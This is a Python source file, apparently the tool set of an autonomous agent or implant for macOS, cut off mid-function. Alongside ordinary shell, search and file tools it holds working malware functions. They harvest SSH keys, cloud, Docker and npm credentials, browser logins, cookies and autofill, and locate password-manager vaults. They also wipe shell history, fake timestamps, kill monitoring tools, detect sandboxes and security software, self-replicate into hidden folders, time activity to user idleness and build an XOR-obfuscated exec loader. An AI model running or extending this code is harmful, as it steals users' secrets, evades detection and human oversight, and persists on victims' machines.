import subprocess
import requests
from bs4 import BeautifulSoup
from duckduckgo_search import DDGS
import os
import json

# --- Tool Implementations ---

def run_shell_command(command):
    """Executes a shell command and returns the output."""
    try:
        # Using shell=True gives full power, including pipes and redirects.
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120  # generous timeout
        )
        if result.returncode == 0:
            return f"STDOUT:\n{result.stdout}"
        else:
            return f"STDERR:\n{result.stderr}\nSTDOUT:\n{result.stdout}"
    except Exception as e:
        return f"Error executing shell command: {str(e)}"

def search_web(query):
    """Searches the web using DuckDuckGo."""
    try:
        with DDGS() as ddgs:
            results = list(ddgs.text(query, max_results=5))
        return json.dumps(results, indent=2)
    except Exception as e:
        return f"Error searching web: {str(e)}"

def scrape_website(url):
    """Downloads and scrapes text content from a website."""
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)'}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Remove script and style elements
        for script in soup(["script", "style"]):
            script.decompose()
            
        text = soup.get_text()
        
        # Break into lines and remove leading/trailing space on each
        lines = (line.strip() for line in text.splitlines())
        # Break multi-headlines into a line each
        chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
        # Drop blank lines
        text = '\n'.join(chunk for chunk in chunks if chunk)
        
        return text[:10000] # Limit to avoid token overflow, can be adjusted
    except Exception as e:
        return f"Error scraping website: {str(e)}"

def read_file(path):
    """Reads a file from the local filesystem."""
    try:
        # Expand user path (e.g., ~/.bash_profile)
        expanded_path = os.path.expanduser(path)
        with open(expanded_path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        return f"Error reading file: {str(e)}"

def write_file(path, content):
    """Writes content to a file."""
    try:
        # Expand user path (e.g., ~/.bash_profile)
        expanded_path = os.path.expanduser(path)
        # Create parent directories if they don't exist
        os.makedirs(os.path.dirname(expanded_path), exist_ok=True)
        with open(expanded_path, 'w', encoding='utf-8') as f:
            f.write(content)
        return f"Successfully wrote to {expanded_path}"
    except Exception as e:
        return f"Error writing file: {str(e)}"

def verify_file_exists(path):
    """Check if a file or directory exists."""
    try:
        expanded_path = os.path.expanduser(path)
        exists = os.path.exists(expanded_path)
        if exists:
            is_file = os.path.isfile(expanded_path)
            is_dir = os.path.isdir(expanded_path)
            size = os.path.getsize(expanded_path) if is_file else "N/A"
            return f"EXISTS: {expanded_path}\nType: {'File' if is_file else 'Directory'}\nSize: {size} bytes"
        else:
            return f"NOT FOUND: {expanded_path}"
    except Exception as e:
        return f"Error checking file: {str(e)}"

def verify_process_running(process_name):
    """Check if a process is currently running."""
    try:
        result = subprocess.run(
            f"ps aux | grep '{process_name}' | grep -v grep",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.stdout.strip():
            return f"RUNNING:\n{result.stdout}"
        else:
            return f"NOT RUNNING: {process_name}"
    except Exception as e:
        return f"Error checking process: {str(e)}"

def create_hidden_directory(path):
    """Create a hidden directory (starts with dot) if it doesn't exist."""
    try:
        expanded_path = os.path.expanduser(path)
        os.makedirs(expanded_path, exist_ok=True)
        # Make it hidden on macOS with chflags
        subprocess.run(f"chflags hidden {expanded_path}", shell=True, capture_output=True)
        return f"Created hidden directory: {expanded_path}"
    except Exception as e:
        return f"Error creating hidden directory: {str(e)}"

def set_file_hidden(path):
    """Make a file or directory hidden on macOS."""
    try:
        expanded_path = os.path.expanduser(path)
        result = subprocess.run(
            f"chflags hidden {expanded_path}",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            return f"File hidden: {expanded_path}"
        else:
            return f"Error: {result.stderr}"
    except Exception as e:
        return f"Error hiding file: {str(e)}"

def clear_command_history():
    """Anti-forensics: Clear shell command history."""
    try:
        commands = [
            "history -c",  # Clear current session
            "rm -f ~/.zsh_history ~/.bash_history",  # Delete history files
            "ln -sf /dev/null ~/.zsh_history",  # Redirect to /dev/null
            "unset HISTFILE"  # Disable history for session
        ]
        results = []
        for cmd in commands:
            subprocess.run(cmd, shell=True, capture_output=True)
            results.append(f"[DONE] {cmd}")
        return "\n".join(results)
    except Exception as e:
        return f"Error clearing history: {str(e)}"

def modify_file_timestamp(path, timestamp=None):
    """Anti-forensics: Modify file creation/modification timestamps."""
    try:
        expanded_path = os.path.expanduser(path)
        if timestamp is None:
            # Set to a random old date (2020-01-01)
            timestamp = "202001010000"
        result = subprocess.run(
            f"touch -t {timestamp} {expanded_path}",
            shell=True,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            return f"Timestamp modified: {expanded_path} -> {timestamp}"
        else:
            return f"Error: {result.stderr}"
    except Exception as e:
        return f"Error modifying timestamp: {str(e)}"

def scan_suid_binaries():
    """Privilege escalation: Find SUID binaries for potential exploitation."""
    try:
        result = subprocess.run(
            "find /usr /bin /sbin -perm -4000 2>/dev/null",
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        binaries = result.stdout.strip().split('\n')
        return f"Found {len(binaries)} SUID binaries:\n" + "\n".join(binaries[:20])
    except Exception as e:
        return f"Error scanning SUID: {str(e)}"

def check_sudo_misconfig():
    """Privilege escalation: Check for sudo misconfigurations."""
    try:
        result = subprocess.run(
            "sudo -l 2>/dev/null || echo 'No sudo access'",
            shell=True,
            capture_output=True,
            text=True,
            timeout=5
        )
        return f"Sudo configuration:\n{result.stdout}"
    except Exception as e:
        return f"Error checking sudo: {str(e)}"

def network_reconnaissance():
    """Reconnaissance: Scan network interfaces and open ports."""
    try:
        # Get network interfaces
        ifconfig = subprocess.run("ifconfig", shell=True, capture_output=True, text=True)
        # Get listening ports
        netstat = subprocess.run("netstat -an | grep LISTEN | head -20", shell=True, capture_output=True, text=True)
        # Get wifi networks
        wifi = subprocess.run("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null | head -10", 
                            shell=True, capture_output=True, text=True)
        
        return f"=== NETWORK RECON ===\n\nLISTENING PORTS:\n{netstat.stdout}\n\nWIFI NETWORKS:\n{wifi.stdout}"
    except Exception as e:
        return f"Error in recon: {str(e)}"

def kill_monitoring_tools():
    """Evasion: Kill common monitoring tools."""
    try:
        tools = ["Activity Monitor", "Console", "lsof", "fs_usage", "dtrace"]
        results = []
        for tool in tools:
            result = subprocess.run(
                f"pkill -9 -i '{tool}' 2>/dev/null",
                shell=True,
                capture_output=True
            )
            if result.returncode == 0:
                results.append(f"[TERMINATED] {tool}")
        return "\n".join(results) if results else "No monitoring tools found"
    except Exception as e:
        return f"Error killing monitors: {str(e)}"

def generate_random_filename(prefix=".", extension=""):
    """Polymorphism: Generate random filename for stealth."""
    import random
    import string
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"{prefix}{random_str}{extension}"

def self_replicate(destination):
    """Polymorphism: Copy self to new location with random name."""
    try:
        import shutil
        source_dir = os.path.dirname(os.path.abspath(__file__))
        dest_path = os.path.expanduser(destination)
        
        # Generate random directory name
        random_name = generate_random_filename()
        full_dest = os.path.join(dest_path, random_name)
        
        # Copy entire directory
        shutil.copytree(source_dir, full_dest)
        
        # Hide it
        subprocess.run(f"chflags hidden {full_dest}", shell=True, capture_output=True)
        
        return f"Replicated to: {full_dest}"
    except Exception as e:
        return f"Error replicating: {str(e)}"

# ===== CREDENTIAL HARVESTING =====

def harvest_ssh_keys():
    """Credential theft: Extract SSH private keys and config."""
    try:
        ssh_dir = os.path.expanduser("~/.ssh")
        results = []
        
        if os.path.exists(ssh_dir):
            # Find private keys
            for file in os.listdir(ssh_dir):
                filepath = os.path.join(ssh_dir, file)
                if os.path.isfile(filepath) and not file.endswith('.pub'):
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read(500)  # First 500 chars
                            if 'PRIVATE KEY' in content:
                                results.append(f"[SSH KEY] {file}: {len(content)} bytes")
                    except:
                        pass
            
            # Parse config for targets
            config_file = os.path.join(ssh_dir, 'config')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    results.append(f"[SSH CONFIG]\n{f.read()}")
        
        return "\n".join(results) if results else "No SSH keys found"
    except Exception as e:
        return f"Error harvesting SSH: {str(e)}"

def dump_keychain_passwords():
    """Extract keychain metadata without password access."""
    try:
        results = []
        
        # ONLY list keychains - this NEVER triggers popup
        cmd = "security list-keychains"
        keychains = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=2)
        results.append(f"[KEYCHAINS DETECTED]\n{keychains.stdout}")
        
        # Check if keychain files exist (metadata only)
        keychain_paths = [
            "~/Library/Keychains/login.keychain-db",
            "~/Library/Keychains/login.keychain"
        ]
        
        for path in keychain_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                size = os.path.getsize(expanded)
                results.append(f"[KEYCHAIN FILE] {path} ({size} bytes)")
        
        results.append("\n[NOTE] Full keychain dump requires user authorization (popup)")
        
        return "\n".join(results)
    except Exception as e:
        return f"Error checking keychain: {str(e)}"

def extract_browser_passwords():
    """Credential theft: Extract saved passwords from browsers."""
    try:
        results = []
        
        # Chrome/Brave passwords (encrypted sqlite db)
        chrome_paths = [
            "~/Library/Application Support/Google/Chrome/Default/Login Data",
            "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data"
        ]
        
        for path in chrome_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                # Just report location - actual decryption requires keychain access
                size = os.path.getsize(expanded)
                results.append(f"[BROWSER DB] {path}: {size} bytes")
        
        # Safari (also encrypted)
        safari_path = os.path.expanduser("~/Library/Safari/Passwords.plist")
        if os.path.exists(safari_path):
            results.append(f"[SAFARI] Passwords.plist found")
        
        return "\n".join(results) if results else "No browser credential stores found"
    except Exception as e:
        return f"Error extracting browser data: {str(e)}"

# ===== ADVANCED CREDENTIAL EXTRACTION =====

def extract_chrome_passwords_advanced():
    """Advanced: Extract Chrome/Brave password metadata (requires Chrome to be CLOSED to avoid popups)."""
    try:
        import sqlite3
        import shutil
        results = []
        
        # CHECK: Warn if browsers are running
        ps_check = subprocess.run("ps aux | grep -iE '(Chrome|Brave)' | grep -v grep | grep -v Helper", 
                                  shell=True, capture_output=True, text=True)
        if ps_check.stdout.strip():
            results.append("[WARNING] Chrome/Brave is running - close browsers first to avoid Keychain popups")
            results.append("[STATUS] Skipping extraction while browsers are active")
            return "\n".join(results)
        
        # Paths to check
        chrome_dbs = [
            ("Chrome", "~/Library/Application Support/Google/Chrome/Default/Login Data"),
            ("Brave", "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data")
        ]
        
        for browser, db_path in chrome_dbs:
            expanded_path = os.path.expanduser(db_path)
            if not os.path.exists(expanded_path):
                continue
            
            # Copy to temp (ONLY if browser is not running)
            temp_db = f"/tmp/{browser}_login_temp.db"
            try:
                shutil.copy2(expanded_path, temp_db)
            except Exception as e:
                results.append(f"[{browser}] Cannot access database: {str(e)}")
                continue
            
            # Query the database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                logins = cursor.fetchall()
                
                results.append(f"[{browser}] Found {len(logins)} stored credentials:")
                for url, username, encrypted_pwd, date in logins[:10]:  # Show first 10
                    # Password is encrypted - show metadata only (NO DECRYPTION = NO POPUP)
                    results.append(f"  {url} | {username} | [ENCRYPTED: {len(encrypted_pwd)} bytes]")
                
                if len(logins) > 10:
                    results.append(f"  ... and {len(logins)-10} more")
                
            except Exception as e:
                results.append(f"[{browser}] Query error: {str(e)}")
            finally:
                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return "\n".join(results) if results else "No Chrome/Brave credentials found"
    except Exception as e:
        return f"Error extracting Chrome passwords: {str(e)}"

def extract_chrome_cookies():
    """Advanced: Extract Chrome/Brave session cookies (close browsers first to avoid popups)."""
    try:
        import sqlite3
        import shutil
        results = []
        
        # CHECK: Browsers must be closed
        ps_check = subprocess.run("ps aux | grep -iE '(Chrome|Brave)' | grep -v grep | grep -v Helper",
                                  shell=True, capture_output=True, text=True)
        if ps_check.stdout.strip():
            return "[WARNING] Close Chrome/Brave first to extract cookies without popups"
        
        cookie_paths = [
            ("Chrome", "~/Library/Application Support/Google/Chrome/Default/Cookies"),
            ("Brave", "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies")
        ]
        
        for browser, cookie_path in cookie_paths:
            expanded = os.path.expanduser(cookie_path)
            if not os.path.exists(expanded):
                continue
            
            temp_db = f"/tmp/{browser}_cookies_temp.db"
            try:
                shutil.copy2(expanded, temp_db)
            except:
                results.append(f"[{browser}] Cookie DB locked")
                continue
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                # Get high-value cookies (session, auth tokens)
                cursor.execute("""
                    SELECT host_key, name, encrypted_value, path 
                    FROM cookies 
                    WHERE name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%'
                    LIMIT 20
                """)
                cookies = cursor.fetchall()
                
                results.append(f"[{browser}] Found {len(cookies)} auth-related cookies:")
                for host, name, enc_value, path in cookies[:10]:
                    results.append(f"  {host} | {name} | [ENCRYPTED: {len(enc_value)} bytes]")
                
            except Exception as e:
                results.append(f"[{browser}] Cookie query error: {str(e)}")
            finally:
                conn.close()
                os.remove(temp_db)
        
        return "\n".join(results) if results else "No cookies extracted"
    except Exception as e:
        return f"Error extracting cookies: {str(e)}"

def extract_chrome_autofill():
    """Advanced: Extract Chrome/Brave autofill data (close browsers first to avoid popups)."""
    try:
        import sqlite3
        import shutil
        results = []
        
        # CHECK: Browsers must be closed
        ps_check = subprocess.run("ps aux | grep -iE '(Chrome|Brave)' | grep -v grep | grep -v Helper",
                                  shell=True, capture_output=True, text=True)
        if ps_check.stdout.strip():
            return "[WARNING] Close Chrome/Brave first to extract autofill without popups"
        
        autofill_paths = [
            ("Chrome", "~/Library/Application Support/Google/Chrome/Default/Web Data"),
            ("Brave", "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Web Data")
        ]
        
        for browser, db_path in autofill_paths:
            expanded = os.path.expanduser(db_path)
            if not os.path.exists(expanded):
                continue
            
            temp_db = f"/tmp/{browser}_webdata_temp.db"
            try:
                shutil.copy2(expanded, temp_db)
            except:
                results.append(f"[{browser}] Web Data locked")
                continue
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                # Autofill profiles (addresses, names, emails)
                cursor.execute("SELECT name, value FROM autofill LIMIT 30")
                autofill = cursor.fetchall()
                
                if autofill:
                    results.append(f"[{browser}] Autofill data ({len(autofill)} entries):")
                    for name, value in autofill[:15]:
                        results.append(f"  {name}: {value}")
                
                # Credit card info (encrypted)
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year FROM credit_cards")
                cards = cursor.fetchall()
                
                if cards:
                    results.append(f"\n[{browser}] Credit cards: {len(cards)} found")
                    for name, month, year in cards:
                        results.append(f"  {name} | Exp: {month}/{year}")
                
            except Exception as e:
                results.append(f"[{browser}] Autofill query error: {str(e)}")
            finally:
                conn.close()
                os.remove(temp_db)
        
        return "\n".join(results) if results else "No autofill data found"
    except Exception as e:
        return f"Error extracting autofill: {str(e)}"

def extract_firefox_passwords():
    """Advanced: Extract Firefox passwords from logins.json."""
    try:
        import json
        results = []
        
        # Firefox profile paths
        firefox_base = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
        
        if not os.path.exists(firefox_base):
            return "[FIREFOX] Not installed"
        
        # Find all profiles
        profiles = [d for d in os.listdir(firefox_base) if os.path.isdir(os.path.join(firefox_base, d))]
        
        for profile in profiles:
            logins_path = os.path.join(firefox_base, profile, "logins.json")
            
            if os.path.exists(logins_path):
                with open(logins_path, 'r') as f:
                    data = json.load(f)
                    logins = data.get('logins', [])
                    
                    results.append(f"[FIREFOX Profile: {profile}]")
                    results.append(f"  {len(logins)} credentials found")
                    
                    for login in logins[:10]:
                        hostname = login.get('hostname', 'unknown')
                        username = login.get('encryptedUsername', '')
                        results.append(f"  {hostname} | [ENCRYPTED]")
                    
                    if len(logins) > 10:
                        results.append(f"  ... and {len(logins)-10} more")
        
        return "\n".join(results) if results else "[FIREFOX] No passwords found"
    except Exception as e:
        return f"Error extracting Firefox: {str(e)}"

def extract_1password_vault():
    """Advanced: Locate and analyze 1Password vault (locked or unlocked)."""
    try:
        results = []
        
        # 1Password vault locations
        onepass_paths = [
            "~/Library/Group Containers/2BUA8C4S2C.com.1password/Library/Application Support/1Password/Data",
            "~/Library/Containers/com.agilebits.onepassword7/Data/Library/Application Support/1Password"
        ]
        
        for path in onepass_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                # Check for vault files
                import glob
                vaults = glob.glob(f"{expanded}/**/*.sqlite", recursive=True)
                vaults += glob.glob(f"{expanded}/**/*.opvault", recursive=True)
                
                if vaults:
                    results.append(f"[1PASSWORD] Found {len(vaults)} vault files:")
                    for vault in vaults:
                        size = os.path.getsize(vault)
                        results.append(f"  {vault} ({size} bytes)")
                
                # Check for running process (unlocked vault in memory)
                ps_check = subprocess.run("ps aux | grep -i '1password' | grep -v grep", 
                                         shell=True, capture_output=True, text=True)
                if ps_check.stdout.strip():
                    results.append(f"\n[1PASSWORD] Process running - vault may be unlocked in memory")
                    results.append(f"  PID: {ps_check.stdout.split()[1]}")
        
        return "\n".join(results) if results else "[1PASSWORD] Not found"
    except Exception as e:
        return f"Error checking 1Password: {str(e)}"

def extract_bitwarden_vault():
    """Advanced: Locate Bitwarden vault."""
    try:
        results = []
        
        # Bitwarden paths
        bitwarden_paths = [
            "~/Library/Application Support/Bitwarden/data.json",
            "~/Library/Application Support/Bitwarden/IndexedDB"
        ]
        
        for path in bitwarden_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                if os.path.isfile(expanded):
                    size = os.path.getsize(expanded)
                    results.append(f"[BITWARDEN] {path} ({size} bytes)")
                    
                    # Try to read (encrypted)
                    try:
                        with open(expanded, 'r') as f:
                            content = f.read(500)
                            if 'encryptedString' in content:
                                results.append("  [STATUS] Vault encrypted (requires master password)")
                    except:
                        pass
                else:
                    results.append(f"[BITWARDEN] Database dir found: {path}")
        
        # Check if running
        ps_check = subprocess.run("ps aux | grep -i 'bitwarden' | grep -v grep",
                                 shell=True, capture_output=True, text=True)
        if ps_check.stdout.strip():
            results.append(f"\n[BITWARDEN] Process running - vault may be unlocked")
        
        return "\n".join(results) if results else "[BITWARDEN] Not found"
    except Exception as e:
        return f"Error checking Bitwarden: {str(e)}"

def memory_scrape_passwords():
    """Advanced: Attempt to scrape passwords from memory of running processes."""
    try:
        results = []
        
        # Target processes that might have passwords in memory
        targets = [
            ("Safari", "com.apple.Safari"),
            ("Chrome", "Google Chrome"),
            ("Brave", "Brave Browser"),
            ("1Password", "1Password"),
            ("Bitwarden", "Bitwarden")
        ]
        
        for name, process in targets:
            ps_cmd = f"ps aux | grep '{process}' | grep -v grep"
            ps_result = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
            
            if ps_result.stdout.strip():
                pid = ps_result.stdout.split()[1]
                results.append(f"[{name}] Running (PID: {pid})")
                
                # Attempt to dump memory (requires privileges)
                # This is demonstration - real memory dump requires root/debugger
                dump_cmd = f"vmmap {pid} 2>&1 | grep -E '(malloc|heap)' | head -5"
                dump_result = subprocess.run(dump_cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if dump_result.stdout.strip():
                    results.append(f"  Memory regions accessible: {len(dump_result.stdout.splitlines())}")
                else:
                    results.append(f"  [BLOCKED] Requires debugging privileges")
        
        return "\n".join(results) if results else "No target processes running"
    except Exception as e:
        return f"Error memory scraping: {str(e)}"

def harvest_cloud_credentials():
    """Credential theft: Find AWS, Azure, GCP credentials."""
    try:
        results = []
        
        # AWS credentials
        aws_creds = os.path.expanduser("~/.aws/credentials")
        if os.path.exists(aws_creds):
            with open(aws_creds, 'r') as f:
                results.append(f"[AWS CREDENTIALS]\n{f.read()}")
        
        # GCP credentials
        gcp_path = os.path.expanduser("~/.config/gcloud/credentials.db")
        if os.path.exists(gcp_path):
            results.append(f"[GCP] credentials.db found")
        
        # Docker credentials
        docker_config = os.path.expanduser("~/.docker/config.json")
        if os.path.exists(docker_config):
            with open(docker_config, 'r') as f:
                results.append(f"[DOCKER CONFIG]\n{f.read()}")
        
        # NPM tokens
        npmrc = os.path.expanduser("~/.npmrc")
        if os.path.exists(npmrc):
            with open(npmrc, 'r') as f:
                content = f.read()
                if 'authToken' in content or '_auth' in content:
                    results.append(f"[NPM TOKENS]\n{content}")
        
        return "\n".join(results) if results else "No cloud credentials found"
    except Exception as e:
        return f"Error harvesting cloud creds: {str(e)}"

def extract_app_tokens():
    """Credential theft: Extract Slack, Discord, VSCode tokens."""
    try:
        results = []
        
        # Slack tokens
        slack_paths = [
            "~/Library/Application Support/Slack/Cookies",
            "~/Library/Application Support/Slack/Local Storage/leveldb"
        ]
        
        for path in slack_paths:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                results.append(f"[SLACK] {path} exists")
        
        # Discord tokens
        discord_path = os.path.expanduser("~/Library/Application Support/discord/Local Storage/leveldb")
        if os.path.exists(discord_path):
            results.append(f"[DISCORD] Token storage found")
        
        # VSCode GitHub token
        vscode_path = os.path.expanduser("~/Library/Application Support/Code/User/globalStorage/state.vscdb")
        if os.path.exists(vscode_path):
            results.append(f"[VSCODE] state.vscdb found (may contain GitHub token)")
        
        return "\n".join(results) if results else "No app tokens found"
    except Exception as e:
        return f"Error extracting tokens: {str(e)}"

# ===== SYSTEM INTEGRITY & DETECTION =====

def check_sip_status():
    """System check: Verify if SIP (System Integrity Protection) is enabled."""
    try:
        result = subprocess.run("csrutil status", shell=True, capture_output=True, text=True)
        status = result.stdout.strip()
        
        # Also check specific protections
        nvram_check = subprocess.run("nvram csr-active-config", shell=True, capture_output=True, text=True)
        
        return f"[SIP STATUS]\n{status}\n\n[NVRAM]\n{nvram_check.stdout}"
    except Exception as e:
        return f"Error checking SIP: {str(e)}"

def detect_virtualization():
    """Anti-analysis: Detect if running in VM or sandbox."""
    try:
        indicators = []
        
        # Check for VM hardware
        sysctl_check = subprocess.run("sysctl hw.model", shell=True, capture_output=True, text=True)
        if "VMware" in sysctl_check.stdout or "VirtualBox" in sysctl_check.stdout:
            indicators.append("[VM] Virtual hardware detected")
        
        # Check for typical VM MAC addresses
        ifconfig = subprocess.run("ifconfig", shell=True, capture_output=True, text=True)
        if "00:0c:29" in ifconfig.stdout or "08:00:27" in ifconfig.stdout:
            indicators.append("[VM] VM MAC address detected")
        
        # Check system serial
        serial = subprocess.run("system_profiler SPHardwareDataType | grep Serial", shell=True, capture_output=True, text=True)
        if "VMware" in serial.stdout or len(serial.stdout.strip()) < 10:
            indicators.append("[VM] Suspicious serial number")
        
        # Check for sandbox indicators
        if os.path.exists("/Library/Frameworks/VMGuestLib.framework"):
            indicators.append("[VM] VMware Guest Tools found")
        
        return "\n".join(indicators) if indicators else "[PHYSICAL] No virtualization detected"
    except Exception as e:
        return f"Error detecting VM: {str(e)}"

def enumerate_security_tools():
    """Anti-analysis: Find installed security products."""
    try:
        results = []
        
        # Check for common AV/EDR
        security_apps = [
            "/Applications/Little Snitch.app",
            "/Applications/LuLu.app",
            "/Library/Little Snitch",
            "/Library/Application Support/Malwarebytes",
            "/Library/Sophos Anti-Virus",
            "/Applications/BlockBlock Helper.app"
        ]
        
        for app in security_apps:
            if os.path.exists(app):
                results.append(f"[SECURITY] {app}")
        
        # Check running security processes
        ps_check = subprocess.run("ps aux | grep -iE '(little|lulu|block|malware|sophos|clamav)' | grep -v grep", 
                                 shell=True, capture_output=True, text=True)
        if ps_check.stdout.strip():
            results.append(f"[RUNNING]\n{ps_check.stdout}")
        
        # Check kernel extensions
        kext_check = subprocess.run("kextstat | grep -iE '(little|lulu|sophos)'", 
                                   shell=True, capture_output=True, text=True)
        if kext_check.stdout.strip():
            results.append(f"[KEXT]\n{kext_check.stdout}")
        
        return "\n".join(results) if results else "[CLEAR] No security tools detected"
    except Exception as e:
        return f"Error enumerating security: {str(e)}"

def check_gatekeeper_status():
    """System check: Verify Gatekeeper configuration."""
    try:
        result = subprocess.run("spctl --status", shell=True, capture_output=True, text=True)
        
        # Also check quarantine xattr handling
        xattr_test = subprocess.run("xattr -l /tmp 2>/dev/null | head -5", shell=True, capture_output=True, text=True)
        
        return f"[GATEKEEPER]\n{result.stdout}\n\n[XATTR TEST]\n{xattr_test.stdout}"
    except Exception as e:
        return f"Error checking Gatekeeper: {str(e)}"

# ===== INTELLIGENT SCHEDULING & EVASION =====

def detect_user_activity():
    """Evasion: Check if user is actively using the machine."""
    try:
        indicators = []
        
        # Check idle time
        idle_cmd = "ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print int($NF/1000000000); exit}'"
        idle_result = subprocess.run(idle_cmd, shell=True, capture_output=True, text=True)
        idle_seconds = int(idle_result.stdout.strip()) if idle_result.stdout.strip().isdigit() else 0
        
        indicators.append(f"[IDLE] {idle_seconds}s since last input")
        
        # Check if screen is locked
        locked = subprocess.run("python3 -c \"import Quartz; print(Quartz.CGSessionCopyCurrentDictionary().get('CGSSessionScreenIsLocked', 0))\" 2>/dev/null || echo 0", 
                               shell=True, capture_output=True, text=True)
        if "1" in locked.stdout:
            indicators.append("[LOCKED] Screen is locked")
        else:
            indicators.append("[UNLOCKED] Screen is active")
        
        # Check active applications
        frontmost = subprocess.run("osascript -e 'tell application \"System Events\" to get name of first process whose frontmost is true' 2>/dev/null", 
                                  shell=True, capture_output=True, text=True)
        if frontmost.stdout.strip():
            indicators.append(f"[FOREGROUND] {frontmost.stdout.strip()}")
        
        # Check camera usage (indicator of video call)
        camera_check = subprocess.run("lsof | grep -i 'applecamera\\|facetime' | head -5", 
                                     shell=True, capture_output=True, text=True)
        if camera_check.stdout.strip():
            indicators.append("[CAMERA] In use - possible video call")
        
        # Recommendation
        if idle_seconds > 300:  # 5 minutes idle
            indicators.append("[STATUS] SAFE TO OPERATE")
        else:
            indicators.append("[STATUS] USER ACTIVE - THROTTLE")
        
        return "\n".join(indicators)
    except Exception as e:
        return f"Error detecting activity: {str(e)}"

def get_optimal_execution_time():
    """Evasion: Determine best time to run operations."""
    try:
        import datetime
        now = datetime.datetime.now()
        hour = now.hour
        
        # Night time (22:00 - 06:00) is optimal
        if hour >= 22 or hour < 6:
            return f"[OPTIMAL] Night time ({hour}:00) - full operations"
        # Work hours (09:00 - 17:00) - high risk
        elif 9 <= hour < 17:
            return f"[HIGH RISK] Work hours ({hour}:00) - minimal activity only"
        # Evening (17:00 - 22:00) - medium risk
        else:
            return f"[MEDIUM RISK] Evening ({hour}:00) - cautious operations"
    except Exception as e:
        return f"Error calculating time: {str(e)}"

def check_system_load():
    """Evasion: Monitor system load to avoid detection."""
    try:
        # CPU load
        cpu_cmd = "ps aux | awk '{sum+=$3} END {print sum}'"
        cpu_result = subprocess.run(cpu_cmd, shell=True, capture_output=True, text=True)
        cpu_load = float(cpu_result.stdout.strip()) if cpu_result.stdout.strip() else 0
        
        # Memory pressure
        mem_cmd = "memory_pressure | grep 'System-wide memory free percentage' | awk '{print $5}' | tr -d '%'"
        mem_result = subprocess.run(mem_cmd, shell=True, capture_output=True, text=True, timeout=5)
        mem_free = mem_result.stdout.strip()
        
        # Recommendation
        status = []
        status.append(f"[CPU] {cpu_load:.1f}% total load")
        status.append(f"[MEM] {mem_free}% free")
        
        if cpu_load > 80:
            status.append("[STATUS] High CPU - PAUSE operations")
        elif cpu_load < 30:
            status.append("[STATUS] Low CPU - SAFE to operate")
        else:
            status.append("[STATUS] Moderate CPU - THROTTLE")
        
        return "\n".join(status)
    except Exception as e:
        return f"Error checking load: {str(e)}"

# ===== ENCRYPTED PERSISTENCE =====

def xor_encrypt(data, key="DEFAULT"):
    """Simple XOR encryption for obfuscation."""
    import base64
    encrypted = bytearray()
    key_bytes = key.encode()
    for i, byte in enumerate(data.encode()):
        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return base64.b64encode(encrypted).decode()

def xor_decrypt(encrypted_data, key="DEFAULT"):
    """Decrypt XOR encrypted data."""
    import base64
    encrypted = base64.b64decode(encrypted_data.encode())
    decrypted = bytearray()
    key_bytes = key.encode()
    for i, byte in enumerate(encrypted):
        decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return decrypted.decode()

def create_encrypted_payload(script_content, output_path):
    """Polymorphism: Create self-decrypting payload."""
    try:
        # Encrypt the actual script
        encrypted = xor_encrypt(script_content)
        
        # Create loader script
        loader = f'''#!/usr/bin/env python3
import base64

def d(e, k="DEFAULT"):
    encrypted = base64.b64decode(e.encode())
    decrypted = bytearray()
    key_bytes = k.encode()
    for i, byte in enumerate(encrypted):
        decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return decrypted.decode()

payload = """{encrypted}"""
exec(d(payload))
'''
        
        expanded_path = os.path.expanduser(output_path)
        with open(expanded_path, 'w') as f:
            f.write(loader)
        
        # Make executable
        os.chmod(expanded_path, 0o755)
        
        return f"Encrypted payload created: {expanded_path}"
    except Exception as e:
        return f"Error creating encrypted payload: {str(e)}"

# ===== ADVANCED NETWORK RECONNAISSANCE =====

def arp_scan_network():
    """Network recon: Discover live hosts on local network."""
    try:
        # Get local IP and subnet
        ifconfig = subprocess.run("ifconfig | grep 'inet ' | grep -v 127.0.0.1", 
                                 shell=True, capture_output=True, text=True)
        
        # ARP scan
        arp_table = subprocess.run("arp -a", shell=True, capture_output=True, text=True)
        
        # Count unique hosts
        hosts = [line for line in arp_table.stdout.split('\n') if '(' in line]
        
        return f"[NETWORK HOSTS] {len(hosts)} discovered\n\n{arp_table.stdout[:500]}"
    except Exception as e:
